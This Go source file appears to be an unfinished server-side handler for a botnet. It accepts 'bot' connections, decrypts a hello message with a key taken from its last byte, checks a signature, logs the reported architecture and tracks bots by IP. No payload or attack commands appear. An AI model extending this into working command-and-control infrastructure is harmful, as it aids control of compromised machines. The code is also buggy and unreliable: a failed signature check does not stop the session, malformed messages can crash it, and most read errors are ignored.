package bot

import (
	"bytes"
	"fmt"
	"net"
	"strings"
)

func (h *Handler) RunConnHandler(conn net.Conn) {
	defer conn.Close()
	defer fmt.Println("bye")

	// disconnect bot if already connected
	if h.services.BotCache.Has(h.bot.Ip) {
		return
	}

	// get hello msg
	var b = make([]byte, 1024)

	n, err := conn.Read(b)
	if err != nil {
		fmt.Printf("[BOT] %s Error: %v ", h.bot.Ip, err)
		return
	}

	parts := bytes.Split(b[:n], []byte("|"))
	if len(parts) < 1 {
		fmt.Println("[BOT] Error: Invalid hello msg")
		return
	}

	key := int(parts[len(parts)-1][0])
	fmt.Println("[BOT] Key:", key)

	d := h.services.Encrypter.Decrypt(string(b[:n]), key)

	msgDecrypted := strings.Split(d, "|")

	if msgDecrypted[0] != HELLO_SIGNATURE {
		fmt.Println("[BOT] Error: Invalid sign")
	}

	fmt.Println("ARCH", msgDecrypted[1])

	h.services.BotCache.Set(h.bot.Ip, h.bot)
	defer h.services.BotCache.Delete(h.bot.Ip)

	for {
		var b = make([]byte, 1024)

		n, err := conn.Read(b)
		if err != nil {
			if err.Error() == "EOF" {
				return
			}
		}

		fmt.Println(string(b[:n]))
		fmt.Println(b[:n])

		fmt.Println("write")

		fmt.Println(b[:n])

		// h.services.Parser.Parse()
	}
}

func (h *Handler) print() {
	h.services.BotCache.Range(func(key, value any) bool {
		fmt.Println(key, value)
		return true
	})
}
